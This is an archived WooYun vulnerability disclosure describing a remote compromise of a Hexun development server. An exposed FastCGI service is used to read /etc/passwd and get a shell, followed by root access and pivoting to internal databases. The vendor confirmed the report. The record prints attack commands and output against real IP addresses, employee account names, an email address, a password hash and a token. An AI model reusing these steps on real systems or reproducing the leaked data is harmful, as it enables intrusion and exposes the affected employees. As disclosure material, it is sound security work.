{"id": 24245, "wybug_id": "wooyun-2015-0113984", "wybug_title": "和讯某开发机远程命令执行导致入侵可漫游内网(大量代码，数据库信息泄露)", "wybug_corp": "和讯网", "wybug_author": "炼金术师", "wybug_date": "2015-05-14 00:18", "wybug_open_date": "2015-06-28 06:28", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向公众公开  简要描述： 我是炼金术师 详细说明：  是一个fastcgi对外导致可包含任意文件，然后通过包含accesslog来getshell\n[root@ljss fastcgi]# php fastcgi.php 60.28.251.103:9000/etc/passwdPHP Deprecated:  Automatically populating $HTTP_RAW_POST_DATA is deprecated and will be removed in a future version. To avoid this warning set 'always_populate_raw_post_data' to '-1' in php.ini and use the php://input stream instead. in Unknown on line 0Content-type: text/html; charset=UTF-8<br /><b>Deprecated</b>:  Automatically populating $HTTP_RAW_POST_DATA is deprecated and will be removed in a future version. To avoid this warning set 'always_populate_raw_post_data' to '-1' in php.ini and use the php://input stream instead. in <b>Unknown</b> on line <b>0</b><br />PHP Warning:  Cannot modify header information - headers already sent in Unknown on line 0<br /><b>Warning</b>:  Cannot modify header information - headers already sent in <b>Unknown</b> on line <b>0</b><br />root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:100:103:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologinxueyanchao:x:500:500::/home/xueyanchao:/bin/bashyangyang:x:501:500::/home/yangyang:/bin/bashliujicheng:x:502:500::/home/liujicheng:/bin/bashkankaijun:x:503:500::/home/kankaijun:/bin/bashwangfei:x:505:500::/home/wangfei:/bin/bashyutao:x:506:500::/home/yutao:/bin/bashzhousihai:x:507:500::/home/zhousihai:/bin/bashfukezhi:x:508:500::/home/fukezhi:/bin/bashliwei:x:509:500::/home/liwei:/bin/bashrongwei:x:510:500::/home/rongwei:/bin/bashmysql:x:511:501::/home/mysql:/bin/bashhjs:x:504:500::/home/hjs:/bin/bash\n   漏洞证明：  拿到服务器root权限\n[root@develop-201136 ~]# ifconfigeth0      Link encap:Ethernet  HWaddr 00:16:3E:13:56:45            inet addr:10.0.201.136  Bcast:10.0.255.255  Mask:255.255.0.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:2804033903 errors:0 dropped:0 overruns:0 frame:0          TX packets:105108118 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:591462481676 (550.8 GiB)  TX bytes:28095262566 (26.1 GiB)eth1      Link encap:Ethernet  HWaddr 00:16:3E:23:DD:3D            inet addr:60.28.251.103  Bcast:60.28.251.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:242317667 errors:0 dropped:0 overruns:0 frame:0          TX packets:11180125 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:29541282634 (27.5 GiB)  TX bytes:1627785463 (1.5 GiB)lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:1711493 errors:0 dropped:0 overruns:0 frame:0          TX packets:1711493 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:3060525634 (2.8 GiB)  TX bytes:3060525634 (2.8 GiB)\n数据库有员工账号密码\nmysql> select count(*) from user    -> ;+----------+| count(*) |+----------+|       12 | +----------+1 row in set (0.03 sec)mysql> select * from user;+---------+------------+----------------+----------------------------------------------+------------------+-------------------+----------------------------+----------------+----------------------------------+--------------------------+----------------------------------+--------------------------+-------------------+----------------+| user_id | user_name  | user_real_name | user_password                                | user_newpassword | user_newpass_time | user_email                 | user_touched   | user_token                       | user_email_authenticated | user_email_token                 | user_email_token_expires | user_registration | user_editcount |+---------+------------+----------------+----------------------------------------------+------------------+-------------------+----------------------------+----------------+----------------------------------+--------------------------+----------------------------------+--------------------------+-------------------+----------------+|       1 | Hexunrd    | wiki???        | :B:b1148930:c3786a2367dc4a6cd8ec82eb7f3c80a7 |                  | NULL              | xueyanchao@staff.hexun.com | 20140522095650 | 0aeedad5fa676af22c6e60961c3f9fbc | NULL                     | NULL                             | NULL                     | 20140519094006    |              1 |\n开发机嘛，源代码\n[root@develop-201136 work]# lsanalyse2.00\t  hermes_common1.00  hermes_server1.00.origin  hx_cache1.00  hxhz2py-1.0  maillist1.00\t    squid_mana1.00  toolana_squidlog1.00  hermes_server1.00  hermes_server1.00.tgz     hx_cache3.00  kjava\t  maillist1.00.tgz  svn_web1.00\n别的数据库也可以连\n[root@develop-201136 ~]# /opt/mysql/bin/mysql -h 10.0.121.65 -ufinance_read -pEnter password: Welcome to the MySQL monitor.  Commands end with ; or \\g.Your MySQL connection id is 68485Server version: 5.1.32-log MySQL Community Server (GPL)Type 'help;' or '\\h' for help. Type '\\c' to clear the buffer.mysql> show databses;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'databses' at line 1mysql> show databases;+--------------------+| Database           |+--------------------+| information_schema | | FINANCE_DB         | | test               | +--------------------+3 rows in set (0.00 sec)\n   修复方案：  fastcgi修复   版权声明：转载请注明来源 炼金术师@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-05-14 06:27 厂商回复： 谢谢处理中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}